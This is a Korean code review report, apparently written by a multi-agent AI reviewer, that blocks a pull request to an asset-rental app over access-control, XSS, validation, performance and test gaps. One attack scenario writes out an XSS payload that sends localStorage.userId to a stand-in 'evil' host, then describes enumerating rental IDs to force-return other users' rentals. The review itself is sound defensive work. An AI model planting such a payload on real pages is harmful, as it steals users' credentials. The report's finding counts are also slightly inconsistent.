# 통합 코드 리뷰 리포트

> Target: `feat/review-handevmin` → `main`
> Reviewer: 합의 기반 멀티 에이전트 (5 agents: Security Specialist + Performance Analyst + Test Coverage Reviewer + Architecture Guardian + Consensus Synthesizer)
> Generated: 2026-05-28
> Commits: 6개
> 변경: 11파일 / +355/-35줄

## Executive Summary

> **이 PR이 머지되면 가장 큰 위험은 "타인 활성 대여 강제 반납으로 자산을 가로채는 권한 누락(rental_id enumeration) + XSS로 userId가 탈취되면 자동화되는 대량 데이터 조작" 입니다.**

**결정**: ☐ Approve / ☐ Approve with comments / ☐ Request changes / ☑ **Block**

| 심각도 | 개수 | 차단 |
|---|---|---|
| Critical | 5 | 5 |
| High | 8 | 6 |
| Medium | 5 | 1 |
| Low | 2 | 0 |
| **총** | **20** | **12** |

**비계획 발견**: 14개 (PR 의도 외, 4개 리뷰 합산)
**결합 시나리오**: 5개 (단독 평가 시 Medium이지만 결합 시 Critical로 승격 2개 포함)

**핵심 권고** (3줄):
- **머지 차단**. 백엔드 결함의 *공통 근본 원인*은 `Service 우회 결정` 하나 — `return_rental`/`extend_rental`/`get_availability_all` 3 함수를 Service로 추출하면서 권한 체크/트랜잭션/이중 상태 동시 복구.
- 프론트엔드 `dangerouslySetInnerHTML`(asset.name) 제거 + `handleError` 콘솔 누설 제거 — SEC-4/SEC-5 결합 시 세션 탈취 즉시 가능.
- `extra_days` Pydantic `Field(ge=1, le=14)` 추가 + 회귀 가드 테스트 (return 권한 negative, extend 음수/경계, "7일 버튼=3일 호출" 라벨/동작 일치) 8건 이상 추가.

---

## Critical Findings (반드시 수정)

### [#1] 반납 API 권한 누락 — 타인 활성 대여 강제 반납 + 자산 가로채기
- **발견자**: Security Specialist (SEC-1) + Architecture Guardian (ARCH-3) + Test Coverage Reviewer (TEST-1, 회귀 가드 부재로 영구화)
- **위치**: `backend/app/routers/rentals.py:60-78`
- **Confidence**: High
- **이슈**: `return_rental`이 `user_id` Depends로 받지만 `rental.user_id == user_id` 비교 없이 진행. `extend_rental`은 체크하는데 `return_rental`만 빠진 *비대칭*. `rental_id`가 순차 정수 → enumeration으로 타인 대여 강제 반납 후 `Asset.status="available"` 가로채기. 테스트는 status_code + `returned_at IS NOT NULL`만 검증해 영구 회귀 가드 부재.
- **수정 방향**: Service 추출 시 `rental_service.return_rental(db, rental_id, current_user_id)` 내부에서 `if rental.user_id != current_user_id: raise HTTPException(403)`. 동시에 `test_return_rental_forbidden_for_other_user` negative 케이스 추가.
- **차단 여부**: **Blocking**
- **컨벤션 위반?**: ARCHITECTURE.md §4 (인증/인가) 정면 위반 — 반납 시나리오를 §4 예시로 명시한 부분 그대로 재현

### [#2] 이중 상태(Asset.status + returned_at) — 비대칭 상태 오염
- **발견자**: Architecture Guardian (ARCH-2) + Security Specialist (UNPLANNED-SEC-2, `assets.py:is_available_now`가 두 출처 모두 사용)
- **위치**: `backend/app/routers/rentals.py:72-75`, `backend/app/routers/assets.py:46-65`
- **Confidence**: High
- **이슈**: 대여 시 `Asset.status` 미설정 / 반납 시 `status="available"` 강제 = 비대칭. 가용성 라벨이 `active_rental` AND `asset.status` 두 출처를 함께 본다. 어드민이 `status='lost'`로 표시해도 반납 한 번에 silent overwrite → 분실/정비 자산이 가용 풀로 복귀.
- **수정 방향**: 단일 진실 원천 채택 — 활성 `Rental` 존재 여부만으로 가용성 도출, `Asset.status`는 행정적 차원(`maintenance`/`lost`)만 유지하며 반납 시 자동 덮어쓰기 금지.
- **차단 여부**: **Blocking**
- **컨벤션 위반?**: ARCHITECTURE.md §2 (단일 진실 원천) 정면 위반 — §2 예시 그대로

### [#3] 비즈니스 로직 Router 직접 작성 — 모든 백엔드 결함의 공통 근본 원인
- **발견자**: Security Specialist (SEC-2) + Architecture Guardian (ARCH-1, ARCH-7, ARCH-10) + Test Coverage Reviewer (TEST-4, 단위 테스트 불가)
- **위치**: `backend/app/routers/rentals.py` 전체, `backend/app/routers/assets.py:46-65`
- **Confidence**: High
- **이슈**: `return_rental`/`extend_rental`/`get_availability_all`이 Service 우회로 Router에서 `db.get`/`commit`/`refresh` 직접 호출. 기존 `create_rental`은 Service 위임 — *신구 패턴 혼재로 다음 신규 라우터가 결함 패턴을 락인*. Service가 없으니 권한/도메인 규칙(MAX_EXTEND_DAYS) 단위 테스트가 통합 테스트로만 가능.
- **수정 방향**: `RentalService.return_rental` / `.extend_rental`, `AssetService.list_with_availability` 3 함수 신설. §1 복구만으로 §2/§4/§5도 자연 회복(ARCH-10 결론).
- **차단 여부**: **Blocking**
- **컨벤션 위반?**: ARCHITECTURE.md §1 (계층 책임) + 패턴 6(P6, 일관성)

### [#4] Stored XSS via `dangerouslySetInnerHTML(asset.name)`
- **발견자**: Security Specialist (SEC-4)
- **위치**: `frontend/src/pages/ReturnExtend.tsx:73-76`
- **Confidence**: High
- **이슈**: Asset.name DB 값을 raw HTML로 렌더. AssetList는 일반 텍스트 렌더 — *이 파일만 비일관*. 어드민 또는 자산 등록 경로로 `<img onerror>` 삽입 시 모든 대여자 ReturnExtend 화면에서 실행.
- **수정 방향**: `dangerouslySetInnerHTML` 제거하고 `{rental.asset.name}` 텍스트 노드로. 더 나아가 자산 등록 시점에 sanitize 또는 허용 문자 검증.
- **차단 여부**: **Blocking**
- **컨벤션 위반?**: 프론트엔드 렌더링 일관성 (AssetList와 비대칭)

### [#5] 테스트 어서션 깊이 부족 — return/extend 권한·경계·부수효과 영구 미감지
- **발견자**: Test Coverage Reviewer (TEST-1, TEST-2)
- **위치**: `backend/tests/test_rentals.py:51-57, 60-69`
- **Confidence**: High
- **이슈**: `test_return_rental_success`는 status_code + `returned_at IS NOT NULL`만, `test_extend_rental_success`는 Pydantic 제약 0건 + 경계(14/15) + 음수 + 권한 모두 0건. *#1, extra_days 검증 부재(#7)가 회귀해도 CI green*.
- **수정 방향**: 추가 케이스 최소 8건 — `return_rental_forbidden_for_other_user`, `return_rental_releases_asset_for_next_renter`, `return_rental_already_returned`, `return_rental_not_found`, `extend_rejects_negative`, `extend_rejects_zero`, `extend_at_max_boundary_passes`, `extend_over_max_boundary_blocked`, `extend_forbidden_for_other_user`, `extend_after_return_blocked`.
- **차단 여부**: **Blocking**
- **컨벤션 위반?**: ARCHITECTURE.md §6 (테스트 가드)

---

## High Priority (수정 권장)

### [#6] 트랜잭션 경계가 Router에 (commit 직접 호출)
- **발견자**: Architecture Guardian (ARCH-4) + Security Specialist (SEC-2 일부)
- **위치**: `backend/app/routers/rentals.py:76, 101`
- **Confidence**: High
- **이슈**: `db.commit()`/`refresh()`가 Router에. 미래 `rental_logs` 추가 시 부분 커밋으로 *반납됐는데 로그 없음* 가능.
- **수정 방향**: Service 내부에서 트랜잭션 경계 캡슐화, Router는 호출만.
- **차단 여부**: **Blocking** (#3과 함께 해결)
- **컨벤션 위반?**: §5 (트랜잭션 경계)

### [#7] `extra_days` 양수/상한 검증 부재 — 음수 입력으로 due_at 과거화
- **발견자**: Security Specialist (SEC-3) + Test Coverage Reviewer (TEST-2)
- **위치**: `backend/app/routers/rentals.py` (`RentalExtend` 스키마)
- **Confidence**: High
- **이슈**: `extra_days: int = 7` 기본만, `gt=0`/`le=N` 없음. 음수 → `due_at` 과거화 → 즉시 연체. extended_days 합산 검증 우회. 회귀 가드 0건.
- **수정 방향**: `extra_days: int = Field(ge=1, le=14)` + 음수/0/경계 테스트.
- **차단 여부**: **Blocking**
- **컨벤션 위반?**: §4 (입력 검증), §6 (테스트 가드)

### [#8] 가용성 API N+1 + 비인덱스 풀스캔
- **발견자**: Performance Analyst (PERF-1) + Architecture Guardian (ARCH-8)
- **위치**: `backend/app/routers/assets.py:46-65`
- **Confidence**: High
- **이슈**: 1 + N 쿼리. `Rental.asset_id`/`returned_at` 인덱스 없음. 자산 200개 시 201 쿼리(≈60ms) + Rental 만건+ 누적 풀스캔으로 1초+. Router에 비즈니스 로직 → 향후 캐시 도입 시 Service 무효화 훅 없어 30분 stale.
- **수정 방향**: `active_rentals_by_asset_id` dict 사전 빌드 또는 `outerjoin` 한 번. 인덱스 `Index('ix_rentals_active', asset_id, returned_at)` 추가.
- **차단 여부**: **Blocking**
- **컨벤션 위반?**: §1 (Router 직접 ORM 루프), §3 (DTO 변환 부재)

### [#9] ReturnExtend 프론트 N+1 워터폴 + 액션 후 전체 reload
- **발견자**: Performance Analyst (PERF-2)
- **위치**: `frontend/src/pages/ReturnExtend.tsx:13-22`
- **Confidence**: High
- **이슈**: `fetchMyRentals` 후 rental마다 별도 GET `/assets/:id`. 활성 10건 = 11 요청. handleReturn/Extend 후 매번 reload → 사용자 3건 연장 시 33 호출.
- **수정 방향**: `fetchAssets` 1회 + `nameById` Map, 또는 백엔드 응답에 `asset_name` include. 액션 후 optimistic update.
- **차단 여부**: **Blocking** (UX 명백한 영향)

### [#10] 라벨/동작 불일치 — "7일 연장" 버튼이 3일 호출
- **발견자**: Test Coverage Reviewer (TEST-6) + Security Specialist (UNPLANNED-SEC-1) + Performance Analyst (UNPLANNED-PERF-2)
- **위치**: `frontend/src/pages/ReturnExtend.tsx` (handleExtend 호출부)
- **Confidence**: High
- **이슈**: UI 라벨과 실제 호출 인자 불일치. 3개 리뷰어가 독립 발견 — 사용자 신뢰 + 환불/분쟁 리스크.
- **수정 방향**: 호출 인자를 7로 수정 또는 라벨을 "3일 연장"으로. 즉시 회귀 가드 테스트 추가 가능.
- **차단 여부**: **Blocking**
- **컨벤션 위반?**: UX 일관성

### [#11] `extended_days` 계산이 Router에서 `.days`만 사용 (off-by-one)
- **발견자**: Architecture Guardian (ARCH-7)
- **위치**: `backend/app/routers/rentals.py:96-100`
- **Confidence**: Medium
- **이슈**: `.days` 절삭으로 분/초 단위 무시 → 누적 한도 계산 시 off-by-one. Router 깊숙이 박혀 회귀 위험.
- **수정 방향**: Service에서 정수 일수 명시 계산(`(new_due - started).days` 또는 `timedelta` 객체 비교).
- **차단 여부**: **Blocking** (#3와 함께)
- **컨벤션 위반?**: §1

### [#12] 신구 패턴 혼재 (Service 위임 vs Router 직접)
- **발견자**: Architecture Guardian (ARCH-10)
- **위치**: `backend/app/routers/rentals.py` 전체
- **Confidence**: High
- **이슈**: 같은 파일에 두 패턴 공존 — 다음 신규 라우터가 표준을 모름 → 결함 패턴 락인.
- **수정 방향**: 모든 endpoint Service 위임으로 통일.
- **차단 여부**: **Blocking** (#3와 함께)
- **컨벤션 위반?**: §1 + P6 (패턴 일관성)

### [#13] Vitest 인프라만 + 컴포넌트 테스트 0건
- **발견자**: Test Coverage Reviewer (TEST-5) + Unplanned (UNPLANNED-TEST-1)
- **위치**: `frontend/tests/`, `frontend/vitest.config.ts`
- **Confidence**: High
- **이슈**: `npm test` 통과 = "FE에 테스트 있다" 거짓 신호. `ReturnExtend`(XSS 포함)가 무테스트. `setup.ts`가 `localStorage 'test-user'` 강제 → 비로그인 테스트 가이드 부재.
- **수정 방향**: smoke 1건 최소 — `ReturnExtend`가 `asset.name`을 텍스트로 렌더(XSS 회귀 가드) + "7일 버튼=7일 호출" 인자 검증.
- **차단 여부**: Non-blocking (smoke 1건은 권고)

---

## Combined Risks (결합 시나리오)

### [COMBO-1] 권한 우회 자동화 — XSS로 userId 탈취 → 대량 반납 enumeration
- **결합 발견**: #4 (XSS, Security SEC-4) + #1 (반납 권한 누락, Security SEC-1 + ARCH-3) + SEC-5 (handleError 콘솔 누설)
- **결합 시 심각도**: **Critical** (XSS 단독 High, 권한 단독 Critical — 결합 시 *자동화·대량화*되어 Critical로 잔류·승격)
- **공격/실패 경로**:
  1. 공격자가 자산 등록 경로(또는 어드민 입력)로 `<img onerror=fetch('//evil/?u='+localStorage.userId)>` 삽입
  2. 모든 대여자 ReturnExtend 화면 진입 시 XSS 실행 → userId(가짜 인증의 유일 자격증명) 탈취
  3. rental_id 순차 정수 enumeration + 권한 미체크 `PATCH /rentals/{id}/return` 무한 호출
  4. 결과: 타인 활성 대여 무차별 반납 + `Asset.status="available"`로 자산 풀 가로채기 + 책임 추적 불가
- **권고**: #1(권한 체크) + #4(XSS 제거) + SEC-5(콘솔 누설 제거) *모두 수정*해야 결합 위험 제거. 셋 중 하나라도 남으면 시나리오 성립.

### [COMBO-2] 상태 영구 불일치 — 동시성 + 트랜잭션 + 이중 상태
- **결합 발견**: #2 (이중 상태, ARCH-2) + #6 (트랜잭션 Router, ARCH-4) + ARCH-5 (동시성 락 부재) + SEC-6 (TOCTOU)
- **결합 시 심각도**: **High** (단독은 각각 High/High/Medium/Medium)
- **공격/실패 경로**:
  1. SQLite 동안은 직렬화로 가려져 있음
  2. Postgres 이전 직후 동시 반납 2회 → returned_at 덮어쓰기 + `Asset.status="available"` 두 번 set
  3. 트랜잭션 경계 Router에 산재 → 부분 커밋으로 `rental_logs` 또는 audit 미기록
  4. 결과: 자산 상태 영구 불일치 + 회계/감사 불가능
- **권고**: #2 + #6 + ARCH-5 + SEC-6 *모두* — 단일 진실 원천 채택 시 §5/§2 동시 해결.

### [COMBO-3] 가용성 정합성 깨짐 — 백엔드 AND vs 프론트 OR + race
- **결합 발견**: PERF-4 (fetchActiveAssetsForUser 클라이언트 재계산) + COMBO-PERF-2 (백엔드 AND vs 프론트 OR) + UNPLANNED-ARCH-4 (§2 거울상)
- **결합 시 심각도**: **High** (단독은 각각 Medium)
- **공격/실패 경로**:
  1. 백엔드 `/assets/availability/all`은 `active_rental` AND `asset.status`
  2. 프론트 `fetchActiveAssetsForUser`는 OR 조건으로 클라이언트 재계산
  3. 같은 자산이 AssetList(가용)과 MyRentals(불가용)에서 *다르게 표시*
  4. 동시 반납 + 가용성 응답 race(COMBO-PERF-1) 겹치면 사용자가 "방금 반납했는데 못 빌리네" 또는 그 반대
- **권고**: 백엔드를 단일 진실 원천으로, 프론트는 그대로 표시만. PERF-4 클라이언트 재계산 제거.

### [COMBO-4] 동시 음수 연장 + 락 부재 = 무결성 파괴
- **결합 발견**: #7 (extra_days 검증 부재, SEC-3 + TEST-2) + SEC-6/ARCH-5 (동시성 락 부재)
- **결합 시 심각도**: **High** (단독은 각각 Medium/Medium)
- **공격/실패 경로**:
  1. 음수 `extra_days` 입력으로 due_at 과거화 → 즉시 연체
  2. 동시 연장 호출 2회로 extended_days 누적 우회
  3. 결과: due_at 무결성 파괴 + 한도 14일 우회로 무한 연장
- **권고**: #7 Field 제약 + Service에서 `SELECT ... FOR UPDATE` 또는 비관적 락.

### [COMBO-5] handleError 로깅 + 응답 누설 = userId 외부 유출
- **결합 발견**: SEC-5 (handleError 콘솔 로깅) + UNPLANNED-SEC-5 (응답에 user_id 그대로) + PERF-5 (매 실패마다 headers 빌드)
- **결합 시 심각도**: **Medium → High** (Sentry/사용자 캡처 도구 통해 외부 유출)
- **공격/실패 경로**:
  1. 백엔드 장애로 handleError 분당 600줄+ 누적
  2. 콘솔에 headers/body/userId 전부 — 사용자 DevTools 스크린샷 또는 Sentry 자동 캡처
  3. rental_id → user_id 매핑 enumeration 자료가 외부 채널로 유출
- **권고**: handleError에서 식별자/응답 본문 제거, 응답 DTO에서 user_id 마스킹 또는 제거.

---

## Unplanned Findings (비계획 발견)

PR 의도 외에 *자연스럽게* 발견된 것들. 워크숍 가치 측정의 핵심.

- [UNPLANNED-1] "7일 연장" 버튼이 `handleExtend(id, 3)` 호출 — 라벨/동작 불일치 (Security + Performance + Test 3개 리뷰어 독립 발견 → 본문 #10으로 승격)
- [UNPLANNED-2] `assets.py:is_available_now`가 `active_rental` AND `asset.status` 둘 다 — §2 거울상 위반 (Security UNPLANNED-SEC-2, #2와 병합)
- [UNPLANNED-3] ReturnExtend가 자산마다 별도 GET 순차 N+1 (Security UNPLANNED-SEC-3, Performance PERF-2와 병합 → #9)
- [UNPLANNED-4] dev deps 공급망 위험 (현재 알려진 취약점 없음) — Security UNPLANNED-SEC-4
- [UNPLANNED-5] 반납/연장 응답에 user_id 그대로 → enumeration 자료 — Security UNPLANNED-SEC-5 (COMBO-5에 포함)
- [UNPLANNED-6] extend 누적 검증식 의도 불명 → 실패 재시도로 부하 증폭 — Performance UNPLANNED-PERF-1
- [UNPLANNED-7] MyRentals useEffect deps 빈 배열로 필터 변경 미반영 → 새로고침 유발 — Performance UNPLANNED-PERF-3
- [UNPLANNED-8] vitest 0건, smoke 1건 필수 — Test UNPLANNED-TEST-1 (본문 #13)
- [UNPLANNED-9] `setup.ts` localStorage 강제로 비로그인 테스트 차단 — Test UNPLANNED-TEST-2
- [UNPLANNED-10] 입력 검증 정책 미정 (400 vs 422) — Test UNPLANNED-TEST-3
- [UNPLANNED-11] `dependency_overrides` 모듈 전역 → pytest-xdist 격리 깨짐 — Test UNPLANNED-TEST-4
- [UNPLANNED-12] Service 단위 테스트 파일 자체 없음 — Test UNPLANNED-TEST-5
- [UNPLANNED-13] Pydantic v1 Config 스타일 잔재 — Architecture UNPLANNED-ARCH-1
- [UNPLANNED-14] `RentalExtend.extra_days` 기본 7 = `DEFAULT_RENTAL_DAYS` 7 우연 충돌 — Architecture UNPLANNED-ARCH-2
- [UNPLANNED-15] `asset_type` 마스터 리스트가 프론트엔드 하드코딩 (단일 진실 원천 위반) — Architecture UNPLANNED-ARCH-3
- [UNPLANNED-16] `fetchActiveAssetsForUser` 클라이언트 가용성 재계산 = §2 거울상 — Architecture UNPLANNED-ARCH-4 (COMBO-3에 포함)

**호스트 통계용 요약**: 4개 리뷰어가 PR 의도(반납/연장/가용성 API 추가) 외에 발견한 항목 **16개**. 그 중 3개가 본문 Critical/High로 승격, 5개가 결합 시나리오에 흡수, 8개가 다음 이터레이션 후보.

---

## Medium / Low (참고)

> 다음 이터레이션에서 다룰 항목들.

- [#14] `handleError`가 headers/body/userId 콘솔 로깅 — Security SEC-5 / `frontend/src/api/client.ts:25-41` / Non-blocking (단독). COMBO-5에서 Blocking으로 승격됨.
- [#15] 동시 반납/연장 락 부재 (TOCTOU) — Security SEC-6 + Architecture ARCH-5 / `rentals.py:66-103` / Non-blocking (SQLite는 직렬화). COMBO-2/COMBO-4에서 Blocking.
- [#16] AssetList 매 렌더 inline filter/sort + `key={index}` — Performance PERF-3 / `frontend/src/pages/AssetList.tsx:39-46, 64-69` / Non-blocking
- [#17] `fetchActiveAssetsForUser` 시리얼 fetch + 클라이언트 조인 (미사용) — Performance PERF-4 / `frontend/src/api/client.ts:52-59` / Non-blocking
- [#18] `handleError` 매 실패마다 headers 객체 빌드 — Performance PERF-5 / Non-blocking
- [#19] 비즈니스 로직 Router → Service 단위 테스트 불가능 — Test TEST-4 / Non-blocking (#3과 함께 해결)
- [#20] `MAX_EXTEND_DAYS` Router 상수 — Architecture ARCH-6 / `rentals.py:16` / Non-blocking
- [#21] Model 직접 반환 (DTO 부재) — Architecture ARCH-9 / `rentals.py:78, 102` / Non-blocking
- [#22] `fetchActiveAssetsForUser` 비로그인 분기 테스트 — Test TEST-7 / Non-blocking
- [#23] DB-state 어서션 부재 (응답 body만 검증) — Test TEST-8 / Non-blocking
- [#24] `/assets/availability/all` 테스트 전무 — Test TEST-3 / **Blocking** (#5와 함께 해결 권장, separate file `backend/tests/test_assets_availability.py`)

---

## 충돌 해결 기록

| 항목 | 충돌 내용 | 결정 | 이유 |
|---|---|---|---|
| handleError 로깅 | Security: "userId/body 누설 → 제거" vs Performance: "진단력 위해 유지" (PERF-5는 메모리만 지적) | **보안 우선** — 식별자/응답 본문 제거, 상태코드/요청 경로만 로깅 | 안전이 걸린 충돌 → 보안 우선 원칙 적용 (CLAUDE.md 명세 §2) |
| return 권한 수정 방식 | Architecture: "Service로 추출 후 추가" vs Security: "당장 권한 한 줄 추가" | **둘 다** — Service 추출과 동시에 권한 체크 포함 | 부분 수정은 #3 신구 패턴 혼재를 악화. ARCH-10 결론(Service 우회 결정 하나가 근본 원인)과 정합 |
| 가용성 단일 진실 원천 | Architecture: "Asset.status 제거" vs (잠재) 운영: "lost/maintenance 어드민 차원 유지 필요" | **분리** — `Asset.status`는 행정적 차원만(`maintenance`/`lost`), 가용성은 `Rental` 활성 여부로만 도출 | 두 관심사 분리가 §2 정신에 부합 |
| 테스트 깊이 vs 머지 속도 | (잠재) 머지 속도 vs Test: "최소 8건 추가" | **테스트 우선** | #1/#7이 회귀해도 CI green인 현 상태는 *영구 회귀 가드 부재* — 머지 차단 사유 |

리뷰어 간 *직접 모순* 권고는 거의 없었고, 위 4건은 모두 통합 판단으로 해소됨.

---

## 다음 이터레이션 후보

> 이번 PR엔 Non-blocking이지만 다음 PR에서 다루면 좋을 항목.

- AssetList 메모이제이션 + `key={asset.id}` 전환 (#16)
- `MAX_EXTEND_DAYS` 등 도메인 상수를 `app/config.py` 또는 `app/services/rental_policy.py`로 이전 (#20)
- 전 응답에 Pydantic Response DTO 도입 (#21) — `internal_notes` 같은 미래 컬럼 노출 방지
- `asset_type` 마스터 리스트 백엔드 endpoint화 (UNPLANNED-15) — 프론트 하드코딩 제거
- Postgres 이전 전 `SELECT ... FOR UPDATE` 또는 advisory lock 도입 (#15)
- pytest-xdist 격리를 위한 `dependency_overrides` 픽스처화 (UNPLANNED-11)
- Service 단위 테스트 파일 신설 (UNPLANNED-12)
- `setup.ts` localStorage 자동 주입을 옵션 픽스처로 (UNPLANNED-9)
- 입력 검증 응답 정책 결정 (400 vs 422) 및 문서화 (UNPLANNED-10)
- handleError에서 식별자 마스킹 + Sentry/캡처 도구 정책 (#14, #18)

---

## 리뷰어별 원본 발견 사항 (요약 — 발견자 속성만 유지)

### Security Specialist (security-reviewer)
- SEC-1 반납 권한 누락 (Critical, Blocking) → 본문 #1
- SEC-2 권한/비즈니스 로직 Router (High, Blocking) → 본문 #3
- SEC-3 extra_days 검증 부재 (Medium, Blocking) → 본문 #7
- SEC-4 dangerouslySetInnerHTML XSS (High, Blocking) → 본문 #4
- SEC-5 handleError 콘솔 누설 (Medium, Non-blocking; 결합 시 Blocking) → 본문 #14, COMBO-5
- SEC-6 동시 반납/연장 락 부재 (Medium, Non-blocking) → #15, COMBO-2/COMBO-4
- COMBO-SEC-1/2/3 → COMBO-1/COMBO-4로 통합
- UNPLANNED-SEC-1~5 → UNPLANNED-1, UNPLANNED-2(→#2), UNPLANNED-3(→#9), UNPLANNED-4, UNPLANNED-5

### Performance Analyst (performance-analyst)
- PERF-1 가용성 N+1 + 비인덱스 (High, Blocking) → 본문 #8
- PERF-2 ReturnExtend 프론트 N+1 워터폴 (High, Blocking) → 본문 #9
- PERF-3 AssetList inline filter/sort + key={index} (Medium, Non-blocking) → #16
- PERF-4 fetchActiveAssetsForUser 시리얼 fetch + 클라이언트 조인 (Medium, Non-blocking) → #17, COMBO-3
- PERF-5 handleError 매 실패 객체 빌드 (Low, Non-blocking) → #18
- COMBO-PERF-1/2 → COMBO-2/COMBO-3로 통합
- UNPLANNED-PERF-1~3 → UNPLANNED-6, UNPLANNED-1(→#10), UNPLANNED-7

### Test Coverage Reviewer (test-coverage-reviewer)
- TEST-1 return_rental 어서션 얕음 (Critical, Blocking) → 본문 #5 + #1
- TEST-2 extend_rental Pydantic + 경계 미검증 (Critical, Blocking) → 본문 #5 + #7
- TEST-3 /assets/availability/all 테스트 전무 (High, Blocking) → #24
- TEST-4 비즈니스 로직 Router → 단위 테스트 불가 (High, Non-blocking) → #19, #3
- TEST-5 Vitest 인프라만 (High, Non-blocking; smoke 1건 권고) → 본문 #13
- TEST-6 "7일=3일" 라벨/동작 불일치 (High, Blocking) → 본문 #10
- TEST-7 비로그인 분기 (Medium, Non-blocking) → #22
- TEST-8 DB-state 어서션 부재 (Low, Non-blocking) → #23
- MANUAL-1~5: QA 체크리스트 항목
- UNPLANNED-TEST-1~5 → UNPLANNED-8(→#13), UNPLANNED-9, UNPLANNED-10, UNPLANNED-11, UNPLANNED-12

### Architecture Guardian (architecture-guardian)
- 13개 §위반 매핑 — 그 중 본문 승격:
  - ARCH-1 Router db.get/commit 직접 (Critical, Blocking) → 본문 #3
  - ARCH-2 이중 상태 (Critical, Blocking) → 본문 #2
  - ARCH-3 return 권한 누락 (Critical, Blocking) → 본문 #1
  - ARCH-4 트랜잭션 Router (High, Blocking) → 본문 #6
  - ARCH-5 동시성 락 (High, Non-blocking) → #15
  - ARCH-6 MAX_EXTEND_DAYS Router (Medium, Non-blocking) → #20
  - ARCH-7 extended_days .days 절삭 (High, Blocking) → 본문 #11
  - ARCH-8 가용성 Router 로직 + N+1 (High, Blocking) → 본문 #8
  - ARCH-9 Model 직접 반환 (Medium, Non-blocking) → #21
  - ARCH-10 신구 패턴 혼재 (High, Blocking) → 본문 #12
- COMBO-ARCH-1/2/3 → COMBO-1/COMBO-2에 통합
- UNPLANNED-ARCH-1~4 → UNPLANNED-13, UNPLANNED-14, UNPLANNED-15, UNPLANNED-16(→COMBO-3)
- **핵심 통찰**: 모든 백엔드 결함이 *Service 우회 결정* 하나의 결과. 3 함수 신설로 §1 복구 → §2/§4/§5 자연 회복.

---

## 7가지 의무 수행 흔적 (자기 검증)

1. **중복 병합**: #1(3리뷰어), #2(2리뷰어), #3(3리뷰어), #5(2리뷰어), #7(2리뷰어), #8(2리뷰어), #10(3리뷰어), #13(2리뷰어) — 공동 발견자 명시
2. **충돌 해결**: 4건 명시 (handleError, return 수정 방식, 가용성 단일 진실, 테스트 vs 속도)
3. **우선순위 재평가**: SEC-3(Medium→High로 승격 in body #7, 결합 시 COMBO-4), SEC-5(Medium 유지하나 결합 시 Critical), PERF-3/4(Medium→Non-blocking 유지)
4. **차단 라벨**: 모든 24개 항목에 Blocking/Non-blocking 명시 (12 Blocking, 12 Non-blocking)
5. **결합 시나리오**: 5개 (COMBO-1~5), 그 중 COMBO-1은 Critical 잔류·승격
6. **비계획 발견**: 16개를 별도 섹션 + 호스트 통계 요약
7. **한 줄 위험 요약**: Executive Summary 최상단에 명시
